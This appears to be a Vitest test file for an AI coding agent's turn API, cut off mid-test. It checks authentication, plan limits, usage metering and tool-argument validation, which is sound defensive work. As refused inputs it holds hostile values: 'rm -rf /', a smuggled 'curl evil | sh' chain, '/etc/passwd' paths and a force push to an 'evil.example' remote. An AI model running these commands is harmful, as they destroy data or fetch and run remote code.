import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { User } from "@supabase/supabase-js";
import { FakeBackend } from "../../../../../lib/account/testing/fakeBackend";
import type { AccountContext } from "../../../../../lib/account/accountContext";

/**
 * POST /api/web/agent/turn — the thinking half of a task done on the user's own computer, through
 * the real route. The service makes one model call per turn and names one tool for the client to
 * run; it runs nothing itself. Every turn is held to the signed-in account, the plan's capability
 * and the plan's usage. The model is a fake: no real credentials are used anywhere here.
 */
const state = vi.hoisted(() => ({ backend: null as unknown as FakeBackend, session: null as User | null }));

vi.mock("../../../../../lib/account/accountContext", async (importOriginal) => {
  const original = await importOriginal<typeof import("../../../../../lib/account/accountContext")>();
  return {
    ...original,
    getAccountContext: async (): Promise<AccountContext | null> => (state.session ? original.resolveAccountContext(state.backend.client(state.session.id), state.session) : null),
  };
});
vi.mock("../../../../../lib/supabase/serviceClient", () => ({ createServiceClient: () => state.backend.client(null, true) }));

import { POST } from "./route";
import { AGENT_TURN_OUTPUT_TOKENS, AGENT_TURN_TIMEOUT_MS, resetAgentTasks } from "../../../../../lib/webAgent/agent";
import { AGENT_SERVER_LIMITS, AGENT_TOOL_NAMES, parseTurnRequest, toolArgs } from "../../../../../lib/webAgent/protocol";
import { WEB_CAPABILITY_RULES } from "../../../../../lib/webPolicy/webCapabilities";

const HOST = "pawos.test";
const post = (body: unknown, origin = `https://${HOST}`) => POST(new Request(`https://${HOST}/api/web/agent/turn`, { method: "POST", headers: { host: HOST, origin, "content-type": "application/json" }, body: typeof body === "string" ? body : JSON.stringify(body) }));

const TASK = "11111111-2222-4333-8444-555555555555";
const WORKSPACE = { name: "shop", branch: "main", files: ["src/cart.ts", "src/cart.test.ts", "package.json"], filesTruncated: false };
const start = (taskId = TASK, goal = "Why does the cart total ignore discounts?") => post({ taskId, goal, workspace: WORKSPACE });
const result = (id: string, output: string, extra: Record<string, unknown> = {}, taskId = TASK) => post({ taskId, result: { id, ok: true, output, ...extra } });

/** What the model answers, in order (the last repeats). */
let modelReplies: unknown[];
let modelCalls: { system: string; user: string }[];
let proUser: User;
let goUser: User;

const reserves = () => state.backend.usageCalls.filter((call) => call.name === "reserve_usage");
const settles = () => state.backend.usageCalls.filter((call) => call.name === "settle_usage");

beforeEach(() => {
  process.env.GEMINI_API_KEY = "test-model-key";
  resetAgentTasks();
  state.backend = new FakeBackend();
  goUser = state.backend.addUser("go-user");
  proUser = state.backend.addUser("pro-user", { subscription: { active: true, tier: "pro" } });
  state.session = proUser;
  modelReplies = [{ tool: "read_file", args: { path: "src/cart.ts" }, note: "Start with the cart" }];
  modelCalls = [];
  vi.spyOn(console, "error").mockImplementation(() => {});
  vi.stubGlobal(
    "fetch",
    vi.fn(async (input: unknown, init?: RequestInit) => {
      const url = String(input);
      if (!url.includes("generativelanguage.googleapis.com")) throw new Error(`Unexpected fetch: ${url}`);
      const sent = JSON.parse(String(init?.body)) as { systemInstruction: { parts: { text: string }[] }; contents: { parts: { text?: string }[] }[] };
      modelCalls.push({ system: sent.systemInstruction.parts[0].text, user: sent.contents.flatMap((content) => content.parts.map((part) => part.text ?? "")).join("\n") });
      const reply = modelReplies.length > 1 ? modelReplies.shift() : modelReplies[0];
      return new Response(JSON.stringify({ candidates: [{ content: { parts: [{ text: typeof reply === "string" ? reply : JSON.stringify(reply) }] } }], usageMetadata: { promptTokenCount: 400, candidatesTokenCount: 60 } }), { status: 200 });
    })
  );
});

afterEach(() => {
  delete process.env.GEMINI_API_KEY;
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("authentication", () => {
  it("a signed-out request is refused before anything is read or any model is called", async () => {
    state.session = null;
    const response = await start();
    expect(response.status).toBe(401);
    expect((await response.json()).code).toBe("not_authenticated");
    expect(modelCalls).toHaveLength(0);
    expect(state.backend.usageCalls).toHaveLength(0);
  });

  it("a request another site made the browser send is refused", async () => {
    const response = await post({ taskId: TASK, goal: "x", workspace: WORKSPACE }, "https://evil.example");
    expect(response.status).toBe(403);
    expect(modelCalls).toHaveLength(0);
  });

  it("a task belongs to the account that started it: another account can't feed it a result", async () => {
    expect((await start()).status).toBe(200);
    state.session = state.backend.addUser("other-pro", { subscription: { active: true, tier: "pro" } });
    const response = await result("step-1", "stolen");
    expect(response.status).toBe(404);
    expect((await response.json()).code).toBe("not_found");
    expect(modelCalls).toHaveLength(1);
  });
});

describe("entitlement: the plan's capability, checked on every turn", () => {
  it("the capability is in the service's own table, for the paid plans", () => {
    const rule = WEB_CAPABILITY_RULES.find((entry) => entry.id === "web.localAgent");
    expect(rule?.availability).toBe("available");
    expect(rule?.tiers).toEqual(["pro", "proMax", "team", "enterprise", "build"]);
    expect(rule?.tiers).not.toContain("go");
  });

  it("Paw Go: refused, with no model call and nothing charged", async () => {
    state.session = goUser;
    const response = await start();
    expect(response.status).toBe(403);
    const body = await response.json();
    expect(body.code).toBe("capability_locked");
    expect(body.turn).toBeUndefined();
    expect(modelCalls).toHaveLength(0);
    expect(state.backend.usageCalls).toHaveLength(0);
  });

  it("nothing in the request can widen the plan", async () => {
    state.session = goUser;
    const response = await post({ taskId: TASK, goal: "x", workspace: WORKSPACE, tier: "pro", plan: "pro", entitled: true, capability: "web.localAgent" });
    expect(response.status).toBe(403);
    expect(modelCalls).toHaveLength(0);
  });

  it("a later turn is checked again: an account that lost the plan mid-task is refused", async () => {
    expect((await start()).status).toBe(200);
    state.backend.addUser("pro-user"); // the subscription is gone
    const response = await result("step-1", "export const total = 1;");
    expect(response.status).toBe(403);
    expect((await response.json()).code).toBe("capability_locked");
    expect(modelCalls).toHaveLength(1);
  });
});

describe("usage: every model call is on the plan's allowance", () => {
  it("each turn reserves and settles usage once", async () => {
    expect((await start()).status).toBe(200);
    expect(reserves()).toHaveLength(1);
    expect(settles()).toHaveLength(1);
    modelReplies = [{ tool: "finish", args: { summary: "Discounts are applied after the total is rounded." } }];
    expect((await result("step-1", "export const total = 1;")).status).toBe(200);
    expect(reserves()).toHaveLength(2);
    expect(settles()).toHaveLength(2);
  });

  it("an exhausted allowance is refused before the model is called, on the first turn", async () => {
    state.backend.usagePool = 0;
    const response = await start();
    expect(response.status).toBe(402);
    expect((await response.json()).turn).toBeUndefined();
    expect(modelCalls).toHaveLength(0);
  });

  it("an allowance that runs out mid-task stops the task there", async () => {
    state.backend.usagePool = 1;
    expect((await start()).status).toBe(200);
    const response = await result("step-1", "export const total = 1;");
    expect(response.status).toBe(402);
    expect(modelCalls).toHaveLength(1);
  });

  it("a first turn that was refused leaves no task behind: it can be started again", async () => {
    state.backend.usagePool = 0;
    expect((await start()).status).toBe(402);
    state.backend.usagePool = 5;
    expect((await start()).status).toBe(200);
  });

  it("Enterprise: one unit of the organization's pool per task, never the member's own buckets", async () => {
    state.backend.addUser("ent-member");
    state.backend.joinOrganization("ent-member", { id: "org-ent", name: "Ent", tier: "enterprise" }, "member");
    state.session = { id: "ent-member", email: "e@example.com", user_metadata: {} } as unknown as User;
    state.backend.organizationLimit = 1;
    expect((await start()).status).toBe(200);
    expect((await result("step-1", "x")).status).toBe(200);
    expect(state.backend.organizationUsage.get("org-ent")).toBe(1);
    expect(reserves()).toHaveLength(0);
    // The pool is spent: a second task is refused before the model is called.
    const calls = modelCalls.length;
    const refused = await start("99999999-2222-4333-8444-555555555555");
    expect(refused.status).toBe(402);
    expect(modelCalls).toHaveLength(calls);
  });
});

describe("the turn: one model call, one tool from the fixed list", () => {
  it("starts a task and answers with the tool the client should run", async () => {
    const response = await start();
    expect(response.status).toBe(200);
    const body = await response.json();
    expect(body).toEqual({ ok: true, turn: { kind: "tool", call: { id: "step-1", name: "read_file", args: { path: "src/cart.ts" } }, note: "Start with the cart" }, turnsLeft: AGENT_SERVER_LIMITS.turns - 1 });
    // The response says what to run. It carries no verdict on whether that is safe: the client decides.
    expect(JSON.stringify(body)).not.toMatch(/safe|risk|approved|trusted/i);
    expect(modelCalls).toHaveLength(1);
    // The model was told the project's name, branch, file names and the task — and no file contents.
    expect(modelCalls[0].user).toContain("src/cart.test.ts");
    expect(modelCalls[0].user).toContain("Why does the cart total ignore discounts?");
  });

  it("carries the tool's result into the next turn, and finishes when the model does", async () => {
    await start();
    modelReplies = [{ tool: "search_files", args: { query: "discount" }, note: "Find discounts" }, { tool: "finish", args: { summary: "The discount is subtracted after rounding." } }];
    const second = await (await result("step-1", "src/cart.ts — lines 1-2 of 2\nexport const total = sum(items);")).json();
    expect(second.turn).toEqual({ kind: "tool", call: { id: "step-2", name: "search_files", args: { query: "discount" } }, note: "Find discounts" });
    expect(modelCalls[1].user).toContain("export const total = sum(items);");
    const last = await (await result("step-2", "src/cart.ts:9: applyDiscount(total)")).json();
    expect(last).toEqual({ ok: true, turn: { kind: "finish", summary: "The discount is subtracted after rounding." }, turnsLeft: 0 });
    // Finished: the task is gone.
    expect((await result("step-2", "again")).status).toBe(404);
  });

  it("a tool the contract doesn't have is never passed on, whatever the model says", async () => {
    for (const tool of ["bash", "run_script", "npm_install", "move_file", "delete_file", "git_reset", "git_clean", "git_merge", "git_rebase", "git_pull", "git_force_push", "git_delete_branch", "git_amend", "git", "shell", "exec", ""]) {
      resetAgentTasks();
      modelReplies = [{ tool, args: { command: "rm -rf /", path: "src/cart.ts", content: "x" } }];
      const response = await start();
      expect(response.status).toBe(502);
      const body = await response.json();
      expect(body.code).toBe("model_unavailable");
      expect(body.turn).toBeUndefined();
    }
  });

  it("a reply that isn't a step doesn't throw the task away: the same result can be sent again and the task carries on", async () => {
    await start();
    // Halfway through: a file was written, then the model's next reply is cut short.
    modelReplies = [{ tool: "write_file", args: { path: "src/types.ts", content: "export type A = 1;" } }, '{"tool": "write_file", "args": {"path": "src/App.tsx", "content": "import', { tool: "bash", args: {} }, { tool: "edit_file", args: { path: "src/cart.ts", oldText: "a", newText: "b" } }];
    expect((await (await result("step-1", "read it")).json()).turn.call.name).toBe("write_file");
    const cut = await result("step-2", "Created src/types.ts (1 line).");
    expect(cut.status).toBe(502);
    expect(await cut.json()).toMatchObject({ code: "model_unavailable", detail: "model_unusable_reply" });
    // Nothing was passed on, and the task is still there, waiting for that same result.
    const again = await result("step-2", "Created src/types.ts (1 line).");
    expect(again.status).toBe(502); // the tool that isn't on the list: still never passed on
    const third = await (await result("step-2", "Created src/types.ts (1 line).")).json();
    expect(third.turn).toEqual({ kind: "tool", call: { id: "step-3", name: "edit_file", args: { path: "src/cart.ts", oldText: "a", newText: "b" } }, note: null });
    // The file that was written is still in what the model is shown.
    expect(modelCalls.at(-1)!.user).toContain("Created src/types.ts (1 line).");
    // A different step's result is still not accepted in its place.
    expect((await result("step-2", "replayed")).status).toBe(409);
  });

  it("asking again is bounded: every unusable reply uses one of the task's turns", async () => {
    await start();
    modelReplies = ["not json at all"];
    let tries = 0;
    let last = 502;
    while (last === 502 && tries < AGENT_SERVER_LIMITS.turns + 5) {
      last = (await result("step-1", "read it")).status;
      tries += 1;
    }
    // It ends by itself, with a finish — not a loop.
    expect(last).toBe(200);
    expect(tries).toBe(AGENT_SERVER_LIMITS.turns - 1);
    expect(modelCalls).toHaveLength(AGENT_SERVER_LIMITS.turns);
  });

  it("a first turn that isn't a step is forgotten, so the task can be started again", async () => {
    modelReplies = ["not json at all", { tool: "read_file", args: { path: "src/cart.ts" } }];
    expect((await start()).status).toBe(502);
    expect((await start()).status).toBe(200);
  });

  it("a turn gets one try with most of the gateway's minute, and room to write a file", async () => {
    const timeouts: number[] = [];
    const realTimeout = AbortSignal.timeout;
    AbortSignal.timeout = (ms: number) => (timeouts.push(ms), realTimeout.call(AbortSignal, ms));
    try {
      await start();
    } finally {
      AbortSignal.timeout = realTimeout;
    }
    expect(timeouts).toEqual([AGENT_TURN_TIMEOUT_MS]);
    expect(AGENT_TURN_TIMEOUT_MS).toBeLessThan(60_000);
    expect(reserves()[0].args.p_max_output_tokens).toBe(AGENT_TURN_OUTPUT_TOKENS);
    expect(modelCalls[0].system).toMatch(/keep every write_file small/);
  });

  it("a large file is passed on whole, exactly as written", async () => {
    const content = Array.from({ length: 1500 }, (_, index) => `export const line${index} = "${"x".repeat(30)}";`).join("\n") + "\n";
    expect(content.length).toBeGreaterThan(60_000);
    modelReplies = [{ tool: "write_file", args: { path: "src/big.ts", content } }];
    const body = await (await start()).json();
    expect(body.turn.call).toEqual({ id: "step-1", name: "write_file", args: { path: "src/big.ts", content } });
  });

  it("a file past the size the contract allows is not passed on, cut or repaired — and the task survives it", async () => {
    await start();
    modelReplies = [{ tool: "write_file", args: { path: "src/huge.ts", content: "x".repeat(200_001) } }, { tool: "finish", args: { summary: "Done another way." } }];
    const refused = await result("step-1", "read it");
    expect(refused.status).toBe(502);
    expect((await refused.json()).turn).toBeUndefined();
    expect((await (await result("step-1", "read it")).json()).turn).toEqual({ kind: "finish", summary: "Done another way." });
  });

  it("a model that times out mid-task leaves the task exactly as it was: no turn used, the same result accepted again", async () => {
    const first = await (await start()).json();
    const answer = vi.mocked(fetch).getMockImplementation()!;
    vi.mocked(fetch).mockImplementationOnce(async () => {
      throw Object.assign(new Error("timed out"), { name: "TimeoutError" });
    });
    const failed = await result("step-1", "read it");
    expect(failed.status).toBe(502);
    expect(await failed.json()).toMatchObject({ code: "model_unavailable", detail: "model_timeout" });
    vi.mocked(fetch).mockImplementation(answer);
    modelReplies = [{ tool: "edit_file", args: { path: "src/cart.ts", oldText: "a", newText: "b" } }];
    const next = await (await result("step-1", "read it")).json();
    expect(next.turn.call).toMatchObject({ id: "step-2", name: "edit_file" });
    expect(next.turnsLeft).toBe(first.turnsLeft - 1); // the turn that timed out was not counted
    expect(modelCalls.at(-1)!.user.match(/--- Step 1:/g)).toHaveLength(1); // and its result is there once
  });

  it("a reply cut off at the output limit is logged by size and the provider's word only — never its text", async () => {
    await start();
    vi.mocked(fetch).mockImplementationOnce(async () => new Response(JSON.stringify({ candidates: [{ finishReason: "MAX_TOKENS", content: { parts: [{ text: '{"tool": "write_file", "args": {"path": "src/App.tsx", "content": "const secretSauce = 1' }] } }], usageMetadata: { promptTokenCount: 400, candidatesTokenCount: 8192 } }), { status: 200 }));
    const cut = await result("step-1", "read it");
    expect(await cut.json()).toMatchObject({ code: "model_unavailable", detail: "model_unusable_reply" });
    const logged = (console.error as unknown as { mock: { calls: unknown[][] } }).mock.calls.map((call) => String(call[0]));
    expect(logged).toEqual([expect.stringMatching(/^\[web-agent\] unusable reply: \d+ characters, finish reason MAX_TOKENS, not JSON$/)]);
    expect(logged.join()).not.toMatch(/secretSauce|App\.tsx|test-model-key/);
    // The cut-off call was still paid for: usage is settled, not released.
    expect(settles()).toHaveLength(2);
  });

  it("a task nobody has touched for a long time is forgotten: its result is refused, and it can't be revived", async () => {
    await start();
    const realNow = Date.now();
    const clock = vi.spyOn(Date, "now").mockReturnValue(realNow + AGENT_SERVER_LIMITS.idleMs + 1000);
    try {
      const late = await result("step-1", "read it");
      expect(late.status).toBe(404);
      expect((await late.json()).code).toBe("not_found");
    } finally {
      clock.mockRestore();
    }
    expect(modelCalls).toHaveLength(1);
  });

  it("malformed arguments are refused, not repaired", async () => {
    for (const reply of [{ tool: "read_file", args: {} }, { tool: "read_file", args: { path: 42 } }, { tool: "search_files", args: { query: "" } }, { tool: "read_file", args: { path: "a\0b" } }, "not json at all"]) {
      resetAgentTasks();
      modelReplies = [reply];
      expect((await start()).status).toBe(502);
    }
  });

  it("arguments the tool doesn't take are dropped", async () => {
    modelReplies = [{ tool: "git_status", args: { command: "push --force", cwd: "/etc" } }];
    expect((await (await start()).json()).turn.call).toEqual({ id: "step-1", name: "git_status", args: {} });
  });

  it("a denied or failed tool result is told to the model as that", async () => {
    await start();
    await post({ taskId: TASK, result: { id: "step-1", ok: false, denied: true, output: "Not allowed: It is an environment file, which can hold secrets." } });
    expect(modelCalls[1].user).toMatch(/refused by the CLI/);
  });

  it("a task ends at the step limit instead of running on", async () => {
    modelReplies = [{ tool: "git_status", args: {}, note: "Look again" }];
    let body = await (await start()).json();
    let turns = 1;
    while (body.turn?.kind === "tool" && turns < 100) {
      body = await (await result(body.turn.call.id, "## main")).json();
      turns += 1;
    }
    expect(turns).toBe(AGENT_SERVER_LIMITS.turns);
    expect(body.turn.kind).toBe("finish");
    expect(modelCalls).toHaveLength(AGENT_SERVER_LIMITS.turns);
    expect(modelCalls.at(-1)!.user).toMatch(/no steps left/);
  });
});

describe("the request is held to the contract", () => {
  it("refuses what isn't a turn", async () => {
    const bad: unknown[] = [
      "not json",
      {},
      { taskId: "short", goal: "x", workspace: WORKSPACE },
      { taskId: TASK },
      { taskId: TASK, goal: "", workspace: WORKSPACE },
      { taskId: TASK, goal: "x".repeat(AGENT_SERVER_LIMITS.goalChars + 1), workspace: WORKSPACE },
      { taskId: TASK, goal: "x" },
      { taskId: TASK, goal: "x", workspace: { ...WORKSPACE, name: "C:\\Users\\me\\shop" } },
      { taskId: TASK, goal: "x", workspace: { ...WORKSPACE, files: ["/etc/passwd"] } },
      { taskId: TASK, goal: "x", workspace: { ...WORKSPACE, files: ["C:\\Windows\\win.ini"] } },
      { taskId: TASK, goal: "x", workspace: { ...WORKSPACE, files: ["../outside.txt"] } },
      { taskId: TASK, goal: "x", workspace: { ...WORKSPACE, files: Array.from({ length: AGENT_SERVER_LIMITS.workspaceFiles + 1 }, (_, index) => `f${index}.ts`) } },
      { taskId: TASK, goal: "x", workspace: WORKSPACE, result: { id: "step-1", ok: true, output: "" } },
      { taskId: TASK, result: { id: "step-1", ok: "yes", output: "" } },
      { taskId: TASK, result: { id: "bad id!", ok: true, output: "" } },
    ];
    for (const body of bad) {
      const response = await post(body);
      expect(response.status, JSON.stringify(body).slice(0, 80)).toBe(400);
      expect((await response.json()).code).toBe("invalid_message");
    }
    expect(modelCalls).toHaveLength(0);
    expect(state.backend.usageCalls).toHaveLength(0);
  });

  it("a result for a task that isn't in progress, or for a step that wasn't asked for, is refused", async () => {
    expect((await result("step-1", "x")).status).toBe(404);
    await start();
    expect((await result("step-7", "x")).status).toBe(409);
    expect((await start()).status).toBe(409); // the same task can't be started twice
    expect(modelCalls).toHaveLength(1);
  });

  it("a result longer than the service keeps is cut, and marked as cut", () => {
    const parsed = parseTurnRequest({ taskId: TASK, result: { id: "step-1", ok: true, output: "x".repeat(AGENT_SERVER_LIMITS.resultChars + 5000) } });
    expect(parsed.ok && parsed.kind === "result" && parsed.result.output.length).toBe(AGENT_SERVER_LIMITS.resultChars);
    expect(parsed.ok && parsed.kind === "result" && parsed.result.truncated).toBe(true);
  });

  it("what the model is sent for one task stays bounded however much the client reports", async () => {
    modelReplies = [{ tool: "read_file", args: { path: "src/cart.ts" } }];
    let body = await (await start()).json();
    for (let turn = 0; turn < 14; turn++) body = await (await result(body.turn.call.id, "y".repeat(AGENT_SERVER_LIMITS.resultChars))).json();
    expect(modelCalls.at(-1)!.user.length).toBeLessThan(AGENT_SERVER_LIMITS.transcriptChars + 40_000);
  });

  it("an account's abandoned tasks make room for a new one: it is never locked out", async () => {
    for (let index = 0; index < AGENT_SERVER_LIMITS.tasksPerAccount + 2; index++) {
      expect((await start(`${index}0000000-2222-4333-8444-555555555555`)).status).toBe(200);
    }
    // The oldest was dropped to make room.
    expect((await result("step-1", "x", {}, "00000000-2222-4333-8444-555555555555")).status).toBe(404);
  });
});

describe("changes to files are requests, typed and bounded", () => {
  it("write_file, edit_file and delete_path are passed on with exactly their arguments", async () => {
    const cases: [unknown, unknown][] = [
      [{ tool: "write_file", args: { path: "src/new.ts", content: "export {};\n", mode: "0777", overwrite: true } }, { id: "step-1", name: "write_file", args: { path: "src/new.ts", content: "export {};\n" } }],
      [{ tool: "write_file", args: { path: "empty.txt", content: "" } }, { id: "step-1", name: "write_file", args: { path: "empty.txt", content: "" } }],
      [{ tool: "edit_file", args: { path: "src/cart.ts", oldText: "a + b", newText: "", replaceAll: true, shell: "rm -rf /" } }, { id: "step-1", name: "edit_file", args: { path: "src/cart.ts", oldText: "a + b", newText: "", replaceAll: true } }],
      [{ tool: "delete_path", args: { path: "src/old", recursive: true, force: true } }, { id: "step-1", name: "delete_path", args: { path: "src/old" } }],
    ];
    for (const [reply, expected] of cases) {
      resetAgentTasks();
      modelReplies = [reply];
      const body = await (await start()).json();
      expect(body.turn.call).toEqual(expected);
      // The answer says what is wanted. It never says the change is approved, safe or to be done without asking.
      expect(Object.keys(body.turn).sort()).toEqual(["call", "kind", "note"]);
      expect(Object.keys(body).sort()).toEqual(["ok", "turn", "turnsLeft"]);
    }
  });

  it("a malformed change is refused, not repaired", async () => {
    for (const reply of [
      { tool: "write_file", args: { path: "a.ts" } },
      { tool: "write_file", args: { path: "a.ts", content: 7 } },
      { tool: "write_file", args: { path: "a.ts", content: "x".repeat(200_001) } },
      { tool: "write_file", args: { content: "x" } },
      { tool: "edit_file", args: { path: "a.ts", oldText: "", newText: "x" } },
      { tool: "edit_file", args: { path: "a.ts", oldText: "x" } },
      { tool: "edit_file", args: { path: "a.ts", oldText: "x", newText: "y", replaceAll: "yes" } },
      { tool: "edit_file", args: { path: "a.ts", patch: "@@ -1 +1 @@\n-x\n+y" } },
      { tool: "delete_path", args: {} },
      { tool: "delete_path", args: { path: "   " } },
    ]) {
      resetAgentTasks();
      modelReplies = [reply];
      expect((await start()).status, JSON.stringify(reply).slice(0, 60)).toBe(502);
    }
  });

  it("the model is told changes need the user's yes, and what it still cannot do", async () => {
    await start();
    const system = modelCalls[0].system;
    expect(system).toMatch(/approve each change/);
    expect(system).toMatch(/Every command is checked by the CLI and may be refused or put to the user first/);
    expect(system).toMatch(/there is no shell, so no pipes, &&, redirects/);
    expect(system).toMatch(/Git is changed only with the Git tools \(git_add, git_commit, git_branch, git_checkout, git_push\)/);
    expect(system).toMatch(/run_command refuses every Git command that is not a plain read/);
    expect(system).toMatch(/There is no tool to force, reset, clean, rebase, merge, pull, delete a branch or rewrite history/);
    expect(system).toMatch(/Do not stage, commit, switch branches or push unless the user's task asks for it; a push is always put to the user/);
    expect(system).toMatch(/never report a failing test or build as passing/);
    expect(system).toMatch(/If the user declines a change, do not ask for the same change again/);
    expect(system).not.toMatch(/you can only LOOK/i);
  });

  it("the user's no reaches the model as a refusal", async () => {
    modelReplies = [{ tool: "edit_file", args: { path: "src/cart.ts", oldText: "a", newText: "b" } }, { tool: "finish", args: { summary: "Left as it was." } }];
    await start();
    const last = await (await post({ taskId: TASK, result: { id: "step-1", ok: false, denied: true, output: "Not allowed: the user declined this change." } })).json();
    expect(modelCalls[1].user).toMatch(/edit_file .* → refused by the CLI\nNot allowed: the user declined this change\./);
    expect(last.turn).toEqual({ kind: "finish", summary: "Left as it was." });
  });

  it("a file the model wrote is not repeated in full on every later turn", async () => {
    const content = "x".repeat(150_000);
    modelReplies = [{ tool: "write_file", args: { path: "big.ts", content } }, { tool: "git_status", args: {} }];
    const first = await (await start()).json();
    expect(first.turn.call.args.content).toHaveLength(150_000); // the client gets all of it
    await result("step-1", "Created big.ts (1 line).");
    expect(modelCalls[1].user).toContain("150,000 characters in all");
    expect(modelCalls[1].user.length).toBeLessThan(10_000);
  });

  it("a change costs what any turn costs: one reserved and settled model call", async () => {
    modelReplies = [{ tool: "write_file", args: { path: "a.ts", content: "a" } }, { tool: "delete_path", args: { path: "a.ts" } }, { tool: "finish", args: { summary: "x" } }];
    await start();
    await result("step-1", "Created a.ts (1 line).");
    await result("step-2", "Deleted a.ts.");
    expect(reserves()).toHaveLength(3);
    expect(settles()).toHaveLength(3);
  });

  it("Paw Go still can't use it, whatever tool is asked for", async () => {
    state.session = goUser;
    modelReplies = [{ tool: "write_file", args: { path: "a.ts", content: "a" } }];
    expect((await start()).status).toBe(403);
    expect(modelCalls).toHaveLength(0);
  });
});

describe("commands are requests: a program and a list of arguments", () => {
  it("run_command, run_tests and build are passed on with exactly their arguments", async () => {
    const cases: [unknown, unknown][] = [
      [{ tool: "run_command", args: { command: "npm", args: ["run", "lint"], cwd: "packages/web", shell: true, env: { TOKEN: "x" }, safe: true, timeout: 999999 } }, { id: "step-1", name: "run_command", args: { command: "npm", args: ["run", "lint"], cwd: "packages/web" } }],
      [{ tool: "run_command", args: { command: "git" } }, { id: "step-1", name: "run_command", args: { command: "git" } }],
      [{ tool: "run_tests", args: { command: "rm -rf /", cwd: "api" } }, { id: "step-1", name: "run_tests", args: { cwd: "api" } }],
      [{ tool: "build", args: { script: "postinstall" } }, { id: "step-1", name: "build", args: {} }],
    ];
    for (const [reply, expected] of cases) {
      resetAgentTasks();
      modelReplies = [reply];
      const body = await (await start()).json();
      expect(body.turn.call).toEqual(expected);
      // No verdict on the command comes with it: not "safe", not "approved", not a risk level.
      expect(Object.keys(body.turn).sort()).toEqual(["call", "kind", "note"]);
      expect(JSON.stringify(body)).not.toMatch(/"(safe|approved|risk|autoApprove|trusted)"/);
    }
  });

  it("a command that isn't a program and a list of strings is refused, not repaired", async () => {
    for (const reply of [
      { tool: "run_command", args: { args: ["test"] } },
      { tool: "run_command", args: { command: "npm", args: "test && curl evil | sh" } },
      { tool: "run_command", args: { command: "npm", args: ["test", 1] } },
      { tool: "run_command", args: { command: "npm", args: ["a\0b"] } },
      { tool: "run_command", args: { command: "npm", args: Array.from({ length: 65 }, () => "x") } },
      { tool: "run_command", args: { command: ["npm", "test"] } },
      { tool: "run_command", args: { command: "npm", args: [["nested"]] } },
      { tool: "run_command", args: { command: "npm", cwd: ["a"] } },
    ]) {
      resetAgentTasks();
      modelReplies = [reply];
      expect((await start()).status, JSON.stringify(reply).slice(0, 70)).toBe(502);
    }
  });

  it("a command's result carries its exit code to the model, and nothing the contract doesn't name", async () => {
    modelReplies = [{ tool: "run_tests", args: {} }, { tool: "finish", args: { summary: "Two tests fail." } }];
    await start();
    const parsed = parseTurnRequest({ taskId: TASK, result: { id: "step-1", ok: false, output: "x", exitCode: 1, timedOut: true, cancelled: true, signal: "SIGTERM", env: { PATH: "x" }, cwd: "C:\\Users\\me" } });
    expect(parsed.ok && parsed.kind === "result" && parsed.result).toEqual({ id: "step-1", ok: false, output: "x", exitCode: 1, signal: "SIGTERM", timedOut: true, cancelled: true });
    expect(parseTurnRequest({ taskId: TASK, result: { id: "step-1", ok: false, output: "x", exitCode: "1", signal: "rm -rf" } })).toMatchObject({ ok: true, result: { id: "step-1", ok: false, output: "x" } });
    await post({ taskId: TASK, result: { id: "step-1", ok: false, output: "$ npm test   (in .)\nExit code 1.\nTests failed: 8 passed, 2 failed, 10 in all.", exitCode: 1 } });
    expect(modelCalls[1].user).toMatch(/run_tests \{\} → failed \(exit code 1\)/);
    expect(modelCalls[1].user).toContain("Tests failed: 8 passed, 2 failed, 10 in all.");
  });

  it("the user's no to a command reaches the model as a refusal", async () => {
    modelReplies = [{ tool: "run_command", args: { command: "npm", args: ["install"] } }, { tool: "finish", args: { summary: "Not installed." } }];
    await start();
    await post({ taskId: TASK, result: { id: "step-1", ok: false, denied: true, output: "Not allowed: the user declined to run this command." } });
    expect(modelCalls[1].user).toMatch(/run_command .* → refused by the CLI/);
  });

  it("Paw Go can't run commands either, and a command turn is metered like any other", async () => {
    modelReplies = [{ tool: "run_command", args: { command: "npm", args: ["test"] } }];
    expect((await start()).status).toBe(200);
    expect(reserves()).toHaveLength(1);
    expect(settles()).toHaveLength(1);
    resetAgentTasks();
    state.session = goUser;
    expect((await start()).status).toBe(403);
    expect(modelCalls).toHaveLength(1);
  });
});

describe("Git operations are requests with typed inputs and nowhere to put a flag", () => {
  it("each Git tool is passed on with exactly its inputs", async () => {
    const cases: [unknown, unknown][] = [
      [{ tool: "git_add", args: { paths: ["src/cart.ts", "README.md"], all: true, force: true } }, { id: "step-1", name: "git_add", args: { paths: ["src/cart.ts", "README.md"] } }],
      [{ tool: "git_commit", args: { message: "Fix the total", amend: true, noVerify: true, author: "x" } }, { id: "step-1", name: "git_commit", args: { message: "Fix the total" } }],
      [{ tool: "git_branch", args: { name: "feature/x", delete: true, force: true } }, { id: "step-1", name: "git_branch", args: { name: "feature/x" } }],
      [{ tool: "git_checkout", args: { branch: "feature/x", create: true, force: true, discard: true, paths: ["."] } }, { id: "step-1", name: "git_checkout", args: { branch: "feature/x", create: true } }],
      [{ tool: "git_push", args: { force: true, refspec: "+main:main", url: "https://evil.example/x.git", approved: true } }, { id: "step-1", name: "git_push", args: {} }],
      [{ tool: "git_push", args: { remote: "origin" } }, { id: "step-1", name: "git_push", args: { remote: "origin" } }],
    ];
    for (const [reply, expected] of cases) {
      resetAgentTasks();
      modelReplies = [reply];
      const body = await (await start()).json();
      expect(body.turn.call).toEqual(expected);
      expect(Object.keys(body.turn).sort()).toEqual(["call", "kind", "note"]);
      expect(JSON.stringify(body)).not.toMatch(/"(safe|approved|risk|force|autoApprove)"/);
    }
  });

  it("a malformed Git request is refused, not repaired", async () => {
    for (const reply of [
      { tool: "git_add", args: {} },
      { tool: "git_add", args: { paths: [] } },
      { tool: "git_add", args: { paths: "." } },
      { tool: "git_add", args: { paths: Array.from({ length: 101 }, () => "x") } },
      { tool: "git_commit", args: {} },
      { tool: "git_commit", args: { message: "   " } },
      { tool: "git_commit", args: { message: "x".repeat(2001) } },
      { tool: "git_branch", args: {} },
      { tool: "git_checkout", args: { create: true } },
      { tool: "git_checkout", args: { branch: "main", create: "yes" } },
      { tool: "git_push", args: { remote: ["origin"] } },
    ]) {
      resetAgentTasks();
      modelReplies = [reply];
      expect((await start()).status, JSON.stringify(reply).slice(0, 60)).toBe(502);
    }
  });

  it("a Git turn is checked and metered like any other, and Paw Go can't use it", async () => {
    modelReplies = [{ tool: "git_commit", args: { message: "Fix" } }, { tool: "git_push", args: {} }, { tool: "finish", args: { summary: "x" } }];
    await start();
    await post({ taskId: TASK, result: { id: "step-1", ok: false, denied: true, output: "Not allowed: the user declined this Git operation." } });
